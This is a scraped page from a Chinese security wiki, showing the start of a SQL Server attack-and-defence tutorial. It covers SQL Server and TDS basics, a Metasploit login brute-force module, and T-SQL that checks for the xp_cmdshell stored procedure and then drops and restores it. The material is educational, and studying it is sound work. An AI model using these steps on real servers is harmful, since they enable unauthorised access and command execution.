+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/">0-Cobalt Strike零基础</a></li>  <li class="file"><a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/">1-Cobalt Strike基础上篇</a></li>  <li class="file"><a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/">1-Cobalt Strike基础中篇</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            数据库安全
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Oracle Database
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/">Oracle Database简单概述</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/">Oracle Database PL/SQL注入漏洞原理</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/">Oracle Database 11g Wrap加密解密分析</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            SQL Server
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file active"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/">SQL Server数据库攻防详解上篇</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/">SQL Server数据库攻防详解下篇</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">SQL Server数据库安全加固</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            漏洞相关
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            MSSQL
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2020-0618_SQL Server Reporting Services远程代码执行漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/BID-23649-Microsoft-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5%E7%88%AC%E7%BD%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">BID-23649_SQL Server链接爬网命令执行漏洞</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            OpenSSL
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/">CVE-2014-0224_OpenSSL中间人漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0160-OpenSSL%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/">CVE-2014-0160_OpenSSL心脏滴血漏洞</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Redis
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">Redis未授权访问漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">Redis主从复制代码执行漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">CVE-2013-7458_Redis redis-cli信息泄露漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/">CVE-2015-4335_Redis EVAL Lua沙箱绕过漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2015-8080_Redis getnum整数溢出漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2016-8339_Redis缓冲区溢出漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/">CVE-2016-10517_Redis跨协议漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-15047_Redis数组索引越界漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2018-11218_Redis Lua缓冲区溢出漏洞</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     <li class="file"><a href="/wiki/hello-world/">Hello World</a></li>  </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-数据库安全/SQL Server/SQL-Server数据库攻防详解上篇" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/">数据库安全</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL-Server/">SQL Server</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/SQL-Server/" rel="tag">SQL Server</a>
+    </div>
+
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/">
+            <time datetime="2021-07-03T01:33:00.000Z" itemprop="datePublished">2021-07-03</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/raw/writing/source/_posts/数据库安全/SQL Server/SQL-Server数据库攻防详解上篇.md"> Source </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/edit/writing/source/_posts/数据库安全/SQL Server/SQL-Server数据库攻防详解上篇.md"> Edit </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/commits/writing/source/_posts/数据库安全/SQL Server/SQL-Server数据库攻防详解上篇.md"> History </a>
+                            </div>
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            SQL Server数据库攻防详解上篇
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+                <div id="toc" class="toc-article">
+                <strong class="toc-title">Catalogue</strong>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">SQL Server概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.1.</span> <span class="toc-text">客户端&#x2F;服务器数据库系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TDS%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">TDS协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">SQL Server暴力破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server%E5%8D%B1%E9%99%A9%E7%9A%84%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">SQL Server危险的存储过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-cmdshell"><span class="toc-number">3.1.</span> <span class="toc-text">xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-regread"><span class="toc-number">3.2.</span> <span class="toc-text">xp_regread</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-fileexist"><span class="toc-number">3.3.</span> <span class="toc-text">xp_fileexist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-getnetname"><span class="toc-number">3.4.</span> <span class="toc-text">xp_getnetname</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-msver"><span class="toc-number">3.5.</span> <span class="toc-text">xp_msver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-fixeddrives"><span class="toc-number">3.6.</span> <span class="toc-text">xp_fixeddrives</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server-%E8%A7%A6%E5%8F%91%E5%99%A8"><span class="toc-number">4.</span> <span class="toc-text">SQL Server 触发器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server-COM%E7%BB%84%E4%BB%B6"><span class="toc-number">5.</span> <span class="toc-text">SQL Server COM组件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SP-OACREATE"><span class="toc-number">5.1.</span> <span class="toc-text">SP_OACREATE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E7%94%A8SP-OACREATE"><span class="toc-number">5.2.</span> <span class="toc-text">启用SP_OACREATE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8SP-OACREATE%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">5.3.</span> <span class="toc-text">利用SP_OACREATE执行命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server-CLR%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">SQL Server CLR相关利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BACLR"><span class="toc-number">6.1.</span> <span class="toc-text">创建CLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8SQL%E8%AF%AD%E5%8F%A5%E5%AF%BC%E5%85%A5%E7%A8%8B%E5%BA%8F%E9%9B%86"><span class="toc-number">6.2.</span> <span class="toc-text">利用SQL语句导入程序集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8CLR%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">6.3.</span> <span class="toc-text">利用CLR执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WarSQLKit"><span class="toc-number">6.4.</span> <span class="toc-text">WarSQLKit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5WarSQLKit-DLL%E6%96%87%E4%BB%B6"><span class="toc-number">6.5.</span> <span class="toc-text">导入WarSQLKit DLL文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WarSQLKit-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">6.6.</span> <span class="toc-text">WarSQLKit 执行命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server-R%E5%92%8CPython%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">SQL Server R和Python的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#R%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8"><span class="toc-number">7.1.</span> <span class="toc-text">R脚本利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8"><span class="toc-number">7.2.</span> <span class="toc-text">Python脚本利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">8.</span> <span class="toc-text">SQL Server代理执行计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8SQL-Server%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1"><span class="toc-number">8.1.</span> <span class="toc-text">启动SQL Server代理服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">8.2.</span> <span class="toc-text">创建计划任务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">9.</span> <span class="toc-text">参考资料</span></a></li></ol>
+                </div>
+            
+        
+        
+            <p>[TOC]</p>
+<p><strong>by Tahir 2021.3.5</strong></p>
+<h2 id="SQL-Server概述"><a href="#SQL-Server概述" class="headerlink" title="SQL Server概述"></a>SQL Server概述</h2><p>SQL Server是Microsoft开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的DBMS之一。SQL Server具有极其广泛的用途，它可以在各个方面使用,从存储个人博客的内容到存储客户数据等。</p>
+<p>在2017版之前，SQL Server仅适用于Windows。 SQL Server 2017中最大的变化之一是，它现在可在Linux和Docker容器上使用。 这意味着可以在Mac上运行SQL Server。</p>
+<p>SQL Server的目前不同版本描述：</p>
+<table>
+<thead>
+<tr>
+<th align="left">版本</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Enterprise Edition</td>
+<td align="left">此版本仅在Windows Server操作系统上运行。 适用于对速度和可用性具有较高优先级的大型生产数据库服务器。提供复制和联机分析过程（OLAP）服务等功能，这些服务可能会增加其安全风险。</td>
+</tr>
+<tr>
+<td align="left">Standard Edition</td>
+<td align="left">该版本与Enterprise Edition相似，但缺少虚拟接口系统局域网（VI SAN）支持和某些高级OLAP功能。</td>
+</tr>
+<tr>
+<td align="left">Personal Edition</td>
+<td align="left">它旨在用于工作站和便携式计算机，而不是服务器。 其设计最多支持五个数据库用户。</td>
+</tr>
+<tr>
+<td align="left">Developer Edition</td>
+<td align="left">面向开发人员版本，它与Enterprise Edition具有相似的功能，但并不意味着可以在真实的生产环境中运行。</td>
+</tr>
+</tbody></table>
+<h3 id="客户端-服务器数据库系统"><a href="#客户端-服务器数据库系统" class="headerlink" title="客户端/服务器数据库系统"></a>客户端/服务器数据库系统</h3><p>SQL Server是一个客户端/服务器数据库管理系统（DBMS）。 这允许有许多不同的客户端同时，全部连接到SQL Server。 这些客户端的每一个都可以通过不同的工具进行连接。</p>
+<p>例如，一个客户端可能使用如SQL Server Management Studio（SSMS）之类的图形工具，而另一客户端可能使用诸如sqlcmd之类的命令行工具。 同时，网站也可以从Web应用程序连接到SQL Server。 并且可能有许多其他客户端都使用自己的工具出于自己的目的进行连接。 </p>
+<p>客户端/服务器DBMS的主要优点是多个用户可以同时访问它，每个用户都有特定的访问级别。如果数据库管理员配置对应的权限，则任何连接到SQL Server的客户端将只能访问他们被允许访问的数据库。 他们只能执行允许执行的任务。 所有这些都从SQL Server本身内部进行控制。</p>
+<h3 id="TDS协议"><a href="#TDS协议" class="headerlink" title="TDS协议"></a>TDS协议</h3><p>表格数据流（Tabular Data Stream, TDS）协议是一种数据库服务器和客户端间交互的应用层协议，为微软SQL Server数据库和Sybase公司数据库产品所采用。</p>
+<p>目前TDS协议版本与SQL Server的对应关系：</p>
+<table>
+<thead>
+<tr>
+<th><strong>TDS Version</strong></th>
+<th><strong>Supported Products</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>4.2</td>
+<td>Sybase SQL Server &lt; 10 and Microsoft SQL Server 6.5</td>
+</tr>
+<tr>
+<td>5.0</td>
+<td>Sybase SQL Server &gt;= 10</td>
+</tr>
+<tr>
+<td>7.0</td>
+<td>Microsoft SQL Server 7.0</td>
+</tr>
+<tr>
+<td>7.1</td>
+<td>Microsoft SQL Server 2000</td>
+</tr>
+<tr>
+<td>7.2</td>
+<td>Microsoft SQL Server 2005</td>
+</tr>
+</tbody></table>
+<p>详细的协议结构分析，请参考：<a target="_blank" rel="external nofollow noopener noreferrer" href="http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html">http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html</a></p>
+<h2 id="SQL-Server暴力破解"><a href="#SQL-Server暴力破解" class="headerlink" title="SQL Server暴力破解"></a>SQL Server暴力破解</h2><p><strong>SQL Server 2005远程连接配置</strong></p>
+<p>​    下载并安装SQL server 2005，启动SQL server的方式如下：</p>
+<ul>
+<li>启动SQL Server Management Studio工具，设置数据库登录模式为混合模式，也就是启用sa账户。</li>
+<li>登录数据库在根节点右键属性-&gt;连接，设置允许远程连接到服务器。</li>
+<li>同样根节点右键方面-&gt;服务器配置，设置RemoteAccessEnabled的值为True。</li>
+<li>启动SQL Server Configuration Manager工具，点击sql sever 服务，需要开启sql sever 和sql sever browser这两个服务。</li>
+<li>SQL server网络配置中选择MSSQLSERVER的协议（有些是SQLEXPRESS，取决于安装数据库的版本）进行IP设置和端口的开启，需要注意的是需要将VIA协议设为禁止，其他打开。</li>
+<li>打开本机防火墙设置-&gt;高级设置-&gt;入站规则-&gt;新建规则，设置端口为1433，一直到最后取个合适的名字保存即可，当然也可以直接关闭防火墙，但是不建议这样做，不安全。</li>
+</ul>
+<p>设置可远程访问SQL server 2005，首先查看SQL server 2005 TCP/IP协议访问的端口1433；其次配置防火墙允许其端口的访问。</p>
+<p>使用msf来执行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mssql/mssql_login</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-1.png"></p>
+<h2 id="SQL-Server危险的存储过程"><a href="#SQL-Server危险的存储过程" class="headerlink" title="SQL Server危险的存储过程"></a>SQL Server危险的存储过程</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p><strong>查询xp_cmdshell存储过程是否存在</strong></p>
+<p>xtype为对象类型，xtype=’x’，表示存储过程的对象类型为扩展存储过程。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-3.png"></p>
+<p>TSQL代码判断是否开启xp_cmdshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">declare @RunningOnACluster char(1)</span><br><span class="line">declare @xp_cmdshell_available char(1)</span><br><span class="line">declare @result int </span><br><span class="line">set @xp_cmdshell_available=&#x27;Y&#x27; </span><br><span class="line">set @result=0</span><br><span class="line">select @RunningOnACluster=case </span><br><span class="line">when convert(int, serverproperty(&#x27;IsClustered&#x27;)) = 1 then &#x27;Y&#x27;</span><br><span class="line">else &#x27;N&#x27; </span><br><span class="line">end </span><br><span class="line">if(0=(select value_in_use from sys.configurations where name=&#x27;xp_cmdshell&#x27;))</span><br><span class="line">	set @xp_cmdshell_available=&#x27;N&#x27; if @RunningOnACluster=&#x27;Y&#x27; </span><br><span class="line">begin</span><br><span class="line">	if @xp_cmdshell_available=&#x27;Y&#x27;</span><br><span class="line">		select @result=1</span><br><span class="line">	if @xp_cmdshell_available=&#x27;N&#x27;</span><br><span class="line">		select @result=2</span><br><span class="line">end</span><br><span class="line">select @result</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-4.png"></p>
+<p><strong>恢复xp_cmdshell存储过程</strong></p>
+<p>解决Error Message:未能找到存储过程 ‘master..xp_cmdshell’。</p>
+<p>第一步先删除：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drop procedure sp_addextendedproc</span><br><span class="line">drop procedure sp_oacreate</span><br><span class="line">exec sp_dropextendedproc &#x27;xp_cmdshell&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>第二步恢复：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)</span><br><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot; &quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-2.png"></p>
+<p>直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程xp_cmdshell的语句:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)</span><br></pre></td></tr></table></figure>
+
